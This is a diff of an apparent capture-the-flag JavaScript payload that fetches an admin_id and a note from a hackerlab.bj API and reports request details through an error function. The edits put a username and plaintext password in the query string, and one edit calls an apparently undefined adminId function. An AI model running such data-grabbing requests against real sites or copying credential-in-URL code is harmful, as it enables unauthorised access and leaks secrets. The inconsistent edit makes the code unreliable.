@@ -48,7 +48,7 @@
   try {
     // Créer une nouvelle instance de XMLHttpRequest pour récupérer l'admin_id
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://xnotes.qualif.hackerlab.bj/api.php", true);
+    xhr.open("GET", "https://xnotes.qualif.hackerlab.bj/api.php?username=Destiny7&password=Motdepasse@2003", true);
     xhr.onreadystatechange = function() {
       if (xhr.readyState == 4) {
         if (xhr.status == 200) {
@@ -67,7 +67,7 @@
                 } else {
                   reportError({
                     message: "Error fetching note",
-                    xhrDetails: getXmlHttpRequestDetails(noteXhr),
+                    ...getXmlHttpRequestDetails(noteXhr),
                     userAgent: navigator.userAgent,
                     url: window.location.href,
                     referrer: document.referrer
@@ -78,7 +78,7 @@
             noteXhr.onerror = function() {
               reportError({
                 message: "Request error fetching note",
-                xhrDetails: getXmlHttpRequestDetails(noteXhr),
+                ...adminId(noteXhr),
                 userAgent: navigator.userAgent,
                 url: window.location.href,
                 referrer: document.referrer
@@ -90,7 +90,7 @@
               message: "Error parsing response",
               error: e.message,
               stack: e.stack,
-              xhrDetails: getXmlHttpRequestDetails(xhr),
+              ...getXmlHttpRequestDetails(xhr),
               userAgent: navigator.userAgent,
               url: window.location.href,
               referrer: document.referrer
@@ -99,7 +99,7 @@
         } else {
           reportError({
             message: "Error fetching admin_id",
-            xhrDetails: getXmlHttpRequestDetails(xhr),
+            ...getXmlHttpRequestDetails(xhr),
             userAgent: navigator.userAgent,
             url: window.location.href,
             referrer: document.referrer
@@ -110,7 +110,7 @@
     xhr.onerror = function() {
       reportError({
         message: "Request error fetching admin_id",
-        xhrDetails: getXmlHttpRequestDetails(xhr),
+        ...getXmlHttpRequestDetails(xhr),
         userAgent: navigator.userAgent,
         url: window.location.href,
         referrer: document.referrer
